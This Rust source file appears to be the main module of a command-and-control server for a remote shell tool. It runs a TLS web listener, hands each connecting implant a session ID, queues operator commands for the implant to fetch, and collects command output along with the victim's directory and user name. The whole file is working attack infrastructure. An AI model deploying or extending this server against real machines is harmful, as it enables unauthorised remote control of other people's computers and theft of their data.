use std::{collections::HashMap, sync::{Mutex, Arc}, time::SystemTime, thread};
use actix_web::{HttpServer, App, web::{self, Bytes}, Responder, get, post, HttpResponseBuilder, http::StatusCode, HttpRequest};
use lazy_static::lazy_static;
use openssl::ssl::{SslAcceptor, SslMethod, SslFiletype};
use uuid::Uuid;
use cli::Session;

use crate::cli::State;
mod cli;
mod payload;
lazy_static! {
    static ref APPLICATION: Arc<Mutex<Application>> = Arc::new(Mutex::new(Application::default()));
}

pub struct Application {
    pub sessions: Mutex<HashMap<Uuid, Session>>,
}

impl Default for Application {
    fn default() -> Self {
        Self { sessions: Mutex::new(HashMap::new()) }
    }
}

#[get("/")]
async fn index(req: HttpRequest) -> impl Responder {
    if let Ok(data) = APPLICATION.lock() {
        let uuid = Uuid::new_v4();
        if let Ok(mut sessions) = data.sessions.lock() {
            sessions.insert(uuid, Session::default());
            println!("Established session [{}] from {}", uuid.to_string(), req.connection_info().peer_addr().unwrap());
            return uuid.to_string()
        }
    }
    return "".to_owned();
}

#[get("/{uuid}")]
async fn cmd_input(path: web::Path<(String,)>, req: HttpRequest) -> impl Responder {
    if let Ok(data) = APPLICATION.lock() {
        if let Ok(uuid) = Uuid::parse_str(path.0.as_str()) {
            if let Ok(mut sessions) = data.sessions.lock() {
                if let Some(session) = sessions.get_mut(&uuid) {
                    session.last_interaction = SystemTime::now();
                    session.state = State::ALIVE;
                    if let Some(dir) = req.headers().get("x-Dir") {
                        session.pwd = dir.to_str().expect("Failed to parse directory string.").to_string()
                    }
                    if let Some(user) = req.headers().get("x-User") {
                        session.user = user.to_str().expect("Failed to parse user string.").to_string()
                    }
                    if session.current_input.1 {
                        let command = session.current_input.0.to_string();
                        session.input_history.push((command.to_string(), SystemTime::now()));
                        session.current_input = ("".to_string(), false);
                        return command
                    }
                }
            }
        }
    }
    return "".to_owned()
}

#[post("/{uuid}")]
async fn cmd_output(path: web::Path<(String,),>, bytes: Bytes, req: HttpRequest) -> impl Responder {
    if let Ok(data) = APPLICATION.lock() {
        if let Ok(uuid) = Uuid::parse_str(path.0.as_str()) {
            if let Ok(mut sessions) = data.sessions.lock() {
                if let Some(session) = sessions.get_mut(&uuid) {
                    if let Ok(body) = String::from_utf8(bytes.to_vec()) {
                        if let Ok(body) = String::from_utf8(body.split(" ").map(|s| u8::from_str_radix(s, 10).unwrap_or(0)).collect::<Vec<u8>>()) {
                            println!("{body}");
                            if let Some(dir) = req.headers().get("x-Dir") {
                                session.pwd = dir.to_str().expect("Failed to parse directory string.").to_string()
                            }
                            if let Some(user) = req.headers().get("x-User") {
                                session.user = user.to_str().expect("Failed to parse user string.").to_string()
                            }
                            session.output_history.push((body, SystemTime::now()));
                            session.last_interaction = SystemTime::now();
                            return HttpResponseBuilder::new(StatusCode::ACCEPTED)
                        }
                    }
                    return HttpResponseBuilder::new(StatusCode::BAD_REQUEST)
                }
            }
        }
    }
    return HttpResponseBuilder::new(StatusCode::NOT_FOUND)
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let _handle_cli = thread::spawn(move || cli::cli());
    let _handle_hearth_beat = thread::spawn(move || hearth_beat());
    let mut builder = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
    builder
        .set_private_key_file("key.pem", SslFiletype::PEM)
        .unwrap();
    builder.set_certificate_chain_file("cert.pem").unwrap();
    HttpServer::new(|| {
        App::new()
        .service(index)
        .service(cmd_input)
        .service(cmd_output)
    })
    .bind_openssl("0.0.0.0:8080", builder)?
    //.bind(("0.0.0.0", 8080))?
    .run()
    .await
}

fn hearth_beat() {
    loop {
        if let Ok(application) = APPLICATION.lock() {
            if let Ok(mut sessions) = application.sessions.lock() {
                for (_k, session) in sessions.iter_mut() {
                    if let Ok(duration) = SystemTime::now().duration_since(session.last_interaction) {
                        if duration.as_secs() > 4 {
                            session.state = State::DEAD
                        } else if duration.as_secs() > 2 {
                            session.state = State::UNKNOWN
                        }
                    }
                }
                drop(sessions)
            }
            drop(application)
        }
    }
}